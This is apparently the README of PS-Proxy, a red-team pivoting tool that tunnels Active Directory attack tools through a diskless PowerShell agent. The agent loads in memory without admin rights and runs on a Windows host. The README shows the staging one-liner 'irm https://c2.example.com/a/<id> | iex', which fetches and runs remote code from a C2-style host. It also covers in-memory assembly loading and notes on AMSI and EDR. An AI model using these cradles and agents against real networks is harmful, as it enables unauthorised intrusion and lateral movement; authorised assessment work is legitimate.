# PS-Proxy

PS-Proxy is being rebuilt as a professional route-based pivot with a Go Linux
server and a single-file PowerShell 5.1 agent. The project goal is reliable
operation for TCP-heavy AD tooling such as Impacket, NetExec, RustHound,
`ldapsearch`, and TCP-connect `nmap`, without proxychains and without requiring
administrator privileges on the Windows agent host.

> Current implementation status: the repo now has a working encrypted enrollment
> flow, a framed multiplexed TCP stream protocol, a diskless PowerShell/C# agent
> packaging flow, and a developer TCP relay for end-to-end protocol testing. The
> full production TUN/netstack data plane is still the next major milestone.

## Design decisions

- **Server:** Go, intended to run as root on Linux.
- **Data plane:** Linux transparent TCP redirect mode is implemented now for test-environment use: local tools connect directly to routed target IPs, iptables redirects matching TCP connections to the server, and the server relays the original destination through the enrolled agent. A true TUN/netstack backend remains the long-term production direction.
- **Agent:** Windows PowerShell 5.1 loader with a precompiled C# core embedded
  into a single `.ps1`.
- **Agent delivery:** one command, one file, no separate DLL transfer:
  `irm https://server/a/<one-time-id> | iex`.
- **Target-side privileges:** no local admin required on the Windows agent host.
- **Enrollment:** the server creates a short-lived one-time staging URL. The
  generated agent script contains an enrollment token rather than a long-term
  PSK.
- **TLS:** server certificate pinning is mandatory for the agent. The C# core
  refuses to continue unless the presented server certificate matches the pinned
  SHA-256 DER hash.
- **Disk behavior:** release agents do not use `Add-Type`, do not invoke
  `csc.exe` on the target, and do not intentionally write the managed agent DLL
  to disk. The embedded DLL is loaded with
  `[System.Reflection.Assembly]::Load(byte[])`.

## Repository layout

```text
cmd/psproxy-server/          Go server entrypoint
internal/protocol/           framed tunnel protocol helpers and tests
internal/staging/            one-time agent staging/enrollment helpers
agent/PSProxy.Agent/         PowerShell 5.1-compatible C# agent core source
agent/loader/agent.ps1.tmpl  single-file PowerShell loader template
release/agent.ps1            packaged release agent placeholder/artifact
tools/build-agent.ps1        Windows build script for release/agent.ps1
agent.ps1                    source-checkout pointer to release agent workflow
```

The GitHub repository intentionally contains both source code and a release
agent location. Packaged releases should replace `release/agent.ps1` with a
ready-to-run generated file so an operator can download and run without doing
manual packaging.

## Build the Go server on Linux

From the repo root:

```bash
go test ./...
go build -o psproxy-server ./cmd/psproxy-server
```

The build produces `./psproxy-server`.

## Build the single-file PowerShell 5.1 release agent

The first supported target is Windows PowerShell 5.1, so build the release agent
on a Windows machine with the .NET Framework compiler available.

Open Windows PowerShell from the repo root and run:

```powershell
powershell -ExecutionPolicy Bypass -File tools\build-agent.ps1
```

That script:

1. Compiles `agent\PSProxy.Agent\PSProxy.Agent.cs` with the .NET Framework C#
   compiler.
2. Compresses the compiled `PSProxy.Agent.dll`.
3. Base64-embeds the compressed DLL into `agent\loader\agent.ps1.tmpl`.
4. Writes the single-file release loader to `release\agent.ps1`.
5. Writes `release\agent_assembly.b64`, which the Go server uses by default to render one-time staged agents.

The Windows target still receives only one PowerShell script. The build step is
for the release maintainer, not the operator running the agent. Keep
`release\agent_assembly.b64` next to the server working directory, or pass it
explicitly with `--agent-assembly-b64-file`.

## Start the server with transparent TCP routing

Use a real certificate whose leaf DER hash will be pinned by the agent. On the
Linux server, run as root so PS-Proxy can install and remove iptables NAT rules:

```bash
sudo ./psproxy-server \
  --domain c2.example.com \
  --cert /etc/letsencrypt/live/c2.example.com/fullchain.pem \
  --key /etc/letsencrypt/live/c2.example.com/privkey.pem \
  --route 10.10.10.0/24 \
  --redirect
```

With `--redirect`, PS-Proxy creates an iptables NAT chain for each `--route` and
redirects matching local TCP connects into a loopback listener. The server reads
the original destination with `SO_ORIGINAL_DST`, sends that host:port through the
encrypted tunnel, and the Windows agent opens the target with a normal outbound
`TcpClient` from its network position.

The server prints a one-time command:

```powershell
irm https://c2.example.com/a/<one-time-id> | iex
```

The generated script auto-starts, loads the embedded C# core in memory, validates
the pinned server certificate, enrolls with the one-time token, and switches to
the framed tunnel protocol.

## Optional fixed-target developer TCP relay

For controlled protocol testing without iptables redirects, use the fixed-target
TCP relay. Example:

```bash
sudo ./psproxy-server \
  --domain c2.example.com \
  --cert /etc/letsencrypt/live/c2.example.com/fullchain.pem \
  --key /etc/letsencrypt/live/c2.example.com/privkey.pem \
  --route 10.10.10.0/24 \
  --tcp-listen 127.0.0.1:1389 \
  --tcp-target 10.10.10.219:389
```

Then run the printed one-liner on the Windows host. After the agent connects,
test from the Linux server:

```bash
nc -vz 127.0.0.1 1389
ldapsearch -x -H ldap://127.0.0.1:1389 -D 'user@example.local' -W -b 'DC=example,DC=local' '(objectClass=domain)'
```

Transparent redirect mode is the recommended test-environment workflow right now.
The fixed-target relay remains useful when you want a single local port mapped to
a single target for debugging.

## Security notes

- Use HTTPS staging. Plain HTTP `irm | iex` is mechanically possible, but it is
  not acceptable for sensitive environments because staging tampering means code
  execution on the Windows host.
- The agent pins the server certificate before enrollment or tunnel traffic.
  Certificate pin mismatch is fatal.
- Enrollment URLs are short-lived and one-time use.
- The enrollment token is placed in the HTTPS response body, not in the URL.
- Do not log generated agent bodies or enrollment tokens.
- The loader avoids intentional target-side file writes for the managed payload,
  but host telemetry, PowerShell logging, AMSI, EDR, crash dumps, or pagefile
  behavior are outside the loader's control.

## Current implementation status

Implemented now:

- Go TLS listener with mixed HTTP staging and raw agent tunnel handling.
- Leaf certificate pin calculation for generated agent configuration.
- Short-lived one-time staging URLs.
- One-time enrollment token validation for the raw tunnel.
- Framed multiplexed stream protocol.
- Linux transparent TCP redirect mode for direct local-tool TCP connections to routed target IPs.
- Fixed-target TCP relay mode for protocol validation.
- C# agent stream relay that opens normal outbound `TcpClient` connections from
  the Windows host.
- PowerShell loader template that loads a compressed/base64 managed assembly from
  memory.
- Windows build script to package the C# core into `release/agent.ps1`.

Next milestone:

- Replace the Linux transparent redirect backend with a true production Go TUN/netstack data plane.
- Add route setup/cleanup and `doctor` checks.
- Add integration tests for LDAP/RustHound-scale long-running TCP streams.

## Testing direction

Before this project should be trusted for real assessments, it needs a lab test
matrix that includes:

- large bidirectional byte-stream integrity tests;
- many concurrent stream tests;
- long-running LDAP/RustHound collection tests;
- NetExec SMB/LDAP tests;
- Impacket SMB/LDAP/RPC tests;
- reconnect and stale route cleanup tests;
- malformed frame and enrollment fuzz tests;
- certificate pin mismatch tests.
